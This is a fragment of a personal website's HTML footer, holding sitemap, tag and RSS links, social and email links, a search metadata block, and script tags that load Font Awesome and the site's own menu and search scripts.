网站地图</a></li> | <li><a href=/zh/tag> 标签</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>